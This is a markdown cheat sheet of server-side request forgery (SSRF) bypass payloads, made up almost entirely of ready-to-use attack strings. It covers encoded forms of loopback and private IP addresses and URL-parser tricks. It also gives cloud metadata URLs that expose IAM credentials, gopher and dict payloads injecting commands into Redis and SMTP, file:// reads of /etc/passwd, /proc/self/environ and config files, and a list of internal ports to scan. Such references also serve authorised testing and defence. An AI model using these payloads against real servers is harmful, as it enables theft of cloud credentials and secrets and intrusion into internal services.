# SSRF Bypass Payloads and Protocols

## IP Representation Variants

```
# Decimal
http://2130706433/         # 127.0.0.1
http://3232235777/         # 192.168.1.1
http://167772161/          # 10.0.0.1

# Hexadecimal
http://0x7f000001/         # 127.0.0.1
http://0xc0a80101/         # 192.168.1.1

# Octal
http://0177.0.0.1/         # 127.0.0.1
http://0177.0.0.0x1/       # Mixed encoding

# IPv6
http://[::1]/
http://[0:0:0:0:0:0:0:1]/
http://[::ffff:127.0.0.1]/
http://[::ffff:7f00:1]/

# Short form
http://127.1/
http://0/
```

## URL Structure Tricks

```
http://target.com@127.0.0.1/     # @ — most parsers ignore left side
http://127.0.0.1#target.com      # Fragment ignored by server
http://127.0.0.1?.target.com     # Query param trick
http://127.0.0.1/target.com/%2f..%2f  # Path confusion

# Double URL encoding
http://%31%32%37%2e%30%2e%30%2e%31/

# Subdomain pointing to 127.0.0.1
http://localtest.me/
http://spoofed.burpcollaborator.net/
```

## Cloud Metadata Endpoints

```
# AWS EC2
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data/
http://[fd00:ec2::254]/latest/meta-data/   # AWS IPv6

# GCP
http://metadata.google.internal/computeMetadata/v1/
http://169.254.169.254/computeMetadata/v1/
# Requires header: Metadata-Flavor: Google

# Azure
http://169.254.169.254/metadata/instance?api-version=2021-02-01
# Requires header: Metadata: true

# Alibaba Cloud
http://100.100.100.200/latest/meta-data/
```

## Protocol Handlers

```
# Gopher — raw TCP injection
gopher://127.0.0.1:6379/_PING%0D%0A        # Redis PING
gopher://127.0.0.1:25/EHLO%20attacker%0D%0A  # SMTP

# Dict — Redis info
dict://127.0.0.1:6379/info

# FTP — file read (rare)
ftp://127.0.0.1/etc/passwd

# File
file:///etc/passwd
file:///proc/self/environ
file:///proc/self/cmdline
file:///var/www/html/config.php

# TFTP (UDP)
tftp://127.0.0.1:69/TESTUDPPACKET
```

## Common Internal Ports to Scan

```
21    FTP
22    SSH
25    SMTP
80    HTTP
443   HTTPS
3306  MySQL
5432  PostgreSQL
6379  Redis
8080  HTTP alternate / Tomcat
8443  HTTPS alternate
27017 MongoDB
11211 Memcached
2375  Docker API (unauthenticated)
9200  Elasticsearch
```
